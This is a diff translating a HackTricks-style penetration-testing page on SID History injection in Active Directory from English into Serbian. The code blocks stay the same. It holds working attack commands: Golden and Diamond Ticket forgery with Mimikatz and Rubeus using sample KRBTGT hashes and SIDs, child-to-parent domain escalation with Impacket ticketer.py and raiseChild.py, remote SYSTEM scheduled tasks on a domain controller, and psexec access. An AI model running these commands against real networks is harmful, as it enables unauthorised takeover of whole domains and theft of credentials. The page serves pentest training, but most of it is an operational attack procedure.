@@ -4,22 +4,19 @@
 
 ## SID History Injection Attack
 
-The focus of the **SID History Injection Attack** is aiding **user migration between domains** while ensuring continued access to resources from the former domain. This is accomplished by **incorporating the user's previous Security Identifier (SID) into the SID History** of their new account. Notably, this process can be manipulated to grant unauthorized access by adding the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain to the SID History. This exploitation confers access to all resources within the parent domain.
+Fokus **SID History Injection Attack** je pomoć **migraciji korisnika između domena** dok se obezbeđuje nastavak pristupa resursima iz prethodne domene. To se postiže **uključivanjem prethodnog Security Identifier-a (SID) korisnika u SID History** njihovog novog naloga. Važno je napomenuti da se ovaj proces može manipulisati kako bi se omogućio neovlašćen pristup dodavanjem SID-a grupe sa visokim privilegijama (kao što su Enterprise Admins ili Domain Admins) iz matične domene u SID History. Ova eksploatacija omogućava pristup svim resursima unutar matične domene.
 
-Two methods exist for executing this attack: through the creation of either a **Golden Ticket** or a **Diamond Ticket**.
+Postoje dve metode za izvršavanje ovog napada: kroz kreiranje **Golden Ticket** ili **Diamond Ticket**.
 
-To pinpoint the SID for the **"Enterprise Admins"** group, one must first locate the SID of the root domain. Following the identification, the Enterprise Admins group SID can be constructed by appending `-519` to the root domain's SID. For instance, if the root domain SID is `S-1-5-21-280534878-1496970234-700767426`, the resulting SID for the "Enterprise Admins" group would be `S-1-5-21-280534878-1496970234-700767426-519`.
+Da bi se odredio SID za grupu **"Enterprise Admins"**, prvo je potrebno locirati SID matične domene. Nakon identifikacije, SID grupe Enterprise Admins može se konstruisati dodavanjem `-519` na SID matične domene. Na primer, ako je SID matične domene `S-1-5-21-280534878-1496970234-700767426`, rezultantni SID za grupu "Enterprise Admins" bi bio `S-1-5-21-280534878-1496970234-700767426-519`.
 
-You could also use the **Domain Admins** groups, which ends in **512**.
+Takođe možete koristiti grupe **Domain Admins**, koje se završavaju sa **512**.
 
-Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
-
+Drugi način da se pronađe SID grupe iz druge domene (na primer "Domain Admins") je sa:
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
-
+### Zlatna ulaznica (Mimikatz) sa KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -36,15 +33,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-
-For more info about golden tickets check:
+Za više informacija o zlatnim karticama proverite:
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
-
+### Dijamantska kartica (Rubeus + KRBTGT-AES256)
 ```powershell
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
@@ -54,21 +49,17 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 
 # You can use "Administrator" as username or any other string
 ```
-
-For more info about diamond tickets check:
+Za više informacija o dijamantskim kartama proverite:
 
 {{#ref}}
 diamond-ticket.md
 {{#endref}}
-
 ```bash
 .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
-
+Povećajte privilegije na DA root ili Enterprise admin koristeći KRBTGT hash kompromitovanog domena:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -80,17 +71,15 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-
-With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+Sa stečenim dozvolama iz napada možete izvršiti, na primer, DCSync napad u novoj domeni:
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-### From linux
+### Iz linux-a
 
-#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
-
+#### Ručno sa [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -110,31 +99,27 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
+#### Automatski koristeći [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+Ovo je Impacket skripta koja će **automatizovati eskalaciju sa child na parent domen**. Skripta zahteva:
 
-This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
+- Ciljni kontroler domena
+- Akreditive za admin korisnika u child domenu
 
-- Target domain controller
-- Creds for an admin user in the child domain
+Tok rada je:
 
-The flow is:
-
-- Obtains the SID for the Enterprise Admins group of the parent domain
-- Retrieves the hash for the KRBTGT account in the child domain
-- Creates a Golden Ticket
-- Logs into the parent domain
-- Retrieves credentials for the Administrator account in the parent domain
-- If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
-
+- Dobija SID za grupu Enterprise Admins u parent domenu
+- Preuzima hash za KRBTGT nalog u child domenu
+- Kreira Zlatnu Ulaznicu
+- Prijavljuje se u parent domen
+- Preuzima akreditive za Administrator nalog u parent domenu
+- Ako je `target-exec` prekidač specificiran, autentifikuje se na Kontroler Domena parent domena putem Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-
-## References
+## Reference
 
 - [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
 - [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
